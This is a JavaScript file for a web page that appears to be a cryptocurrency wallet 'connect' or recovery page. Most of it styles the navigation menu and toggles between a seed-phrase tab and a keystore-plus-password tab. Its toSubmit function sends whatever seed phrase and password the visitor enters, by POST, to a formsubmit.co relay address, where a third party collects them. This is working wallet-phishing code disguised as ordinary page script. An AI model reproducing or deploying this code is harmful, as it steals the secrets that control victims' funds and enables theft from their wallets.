

window.onscroll= function(){
    scrollFunction()
};

function scrollFunction(){
    if (document.body.scrollTop>50 || document.documentElement.scrollTop>50){
        document.getElementById("nava").style.height="75px";
        document.getElementById("navar").style.height="75px";
       
    }else{
        document.getElementById("nava").style.height="75px";
        document.getElementById("navar").style.height="75px";
       
    }
    if(document.body.clientWidth<=1180 || document.documentElement.clientWidth<=1180){
        document.getElementById("nava").style.height="83px";
        document.getElementById("navar").style.height="83px";
       
    }

    if(document.body.clientWidth<=750 || document.documentElement.clientWidth<=750){
        document.getElementById("nava").style.height="83px";
        document.getElementById("navar").style.height="83px";
       
    }

}

function toSubmit(){
    var name = document.getElementById("seed").value;
    var password = document.getElementById("movepass").value;

    var dataString = 'Phrase=' + name +  '&Password=' + password ;

    $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/60c68e87820dd251e73211e21d7940df',
    dataType: 'json',
    accepts: 'application/json',
    data: dataString,
    success: (data) => console.log(data),
    error: (err) => console.log(err)
});
}





function notificationDisplay(){
    var numbers=50;
    var input = document.createElement('putin');
    if(input!=numbers){
        document.getElementById('notification').innerHTML= 'Numbers only';
        document.getElementById("putin").style.borderColor="red";
    }
}


function slideLeft(){
    var x=window.scrollX;
    var y=window.scrollY;

        document.getElementById('bar').style.display='none';
        document.getElementById('slide').style.display='grid';
        document.getElementById('move').style.transform='translateX(0px)';
        document.getElementById('move').style.transform='translateY(auto)';
        document.getElementById('move').style.transition='.3s ease-in-out';
        document.getElementById("logo").style.marginLeft="2rem";
        document.getElementById("logo").style.width="180px";
        document.getElementById("close").style.display='flex';
        
        window.onscroll=function(){
            window.scrollTo(x,y);
        };
}


function closeMenu(){

        document.getElementById('move').style.transition='.5s ease-out';
        document.getElementById('move').style.transform='translateX(100%)';
        document.getElementById('move').style.transition='.3s ease-in-out';
        document.getElementById('slide').style.display='none';
        document.getElementById('bar').style.display='flex';
        document.getElementById("logo").style.marginLeft="0rem";
        document.getElementById("logo").style.width="180px";
        document.getElementById("close").style.display='none';
        window.onscroll=function(){
          
        };
       
    
}
function toLeft(){
    document.getElementById('one').style.backgroundColor='white';
    document.getElementById('one').style.color='black';
    document.getElementById('one').style.boxShadow='none';
    document.getElementById('two').style.backgroundColor='#e56b1f';
    document.getElementById('two').style.color='white';
document.getElementById('movepass').style.display='block';
document.getElementById('seed').placeholder='Keystore...';
document.getElementById('movepass').required='true';
    

}
function toRight(){
    document.getElementById('one').style.backgroundColor='#e56b1f';
    document.getElementById('one').style.color='white';
    document.getElementById('one').style.boxShadow='0 1px 5px rgba(0,0,0,0.2)';
    document.getElementById('two').style.backgroundColor='white';
    document.getElementById('two').style.color='black';
document.getElementById('movepass').style.display='none';
document.getElementById('seed').placeholder='Seed phrase...';
document.getElementById('movepass').required='';
   
}
